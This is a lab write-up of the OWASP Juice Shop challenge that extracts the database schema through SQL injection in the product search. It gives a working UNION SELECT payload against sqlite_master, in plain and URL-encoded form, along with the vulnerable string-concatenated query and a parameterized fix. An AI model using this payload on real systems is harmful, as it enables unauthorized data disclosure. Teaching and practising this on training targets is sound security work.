# Database Schema – SQL Injection

**Category:** Injection
**Goal:** Exfiltrate the complete database schema using SQL Injection.

### Steps

1. Open Juice Shop and search for any product.
2. Capture the request in **Burp Suite → Repeater**:

```http
GET /rest/products/search?q=banana
```

3. Test the `q` parameter for SQL Injection.
4. The query uses **9 columns**, so the `UNION SELECT` must also contain 9 columns.
5. SQLite stores schema information in `sqlite_master`.

### Payload

```text
banana')) UNION SELECT 'a','b','c',sql,NULL,NULL,NULL,NULL,NULL FROM sqlite_master--
```

URL-encoded:

```text
banana%27%29%29%20UNION%20SELECT%20%27a%27%2C%27b%27%2C%27c%27%2Csql%2CNULL%2CNULL%2CNULL%2CNULL%2CNULL%20FROM%20sqlite_master--
```

### Result

The response exposes `CREATE TABLE` statements from:

```sql
sqlite_master.sql
```

This reveals the database schema.

### Vulnerable Code

```javascript
models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)
```

**Root cause:** User input is directly concatenated into SQL.

### Fix

Use Sequelize parameterized queries:

```javascript
models.sequelize.query(query, {
  replacements: { criteria }
})
```

**Impact:** SQL query manipulation and database schema disclosure.

**Key takeaway:** Never concatenate untrusted input directly into SQL; use **parameterized queries / prepared statements**.
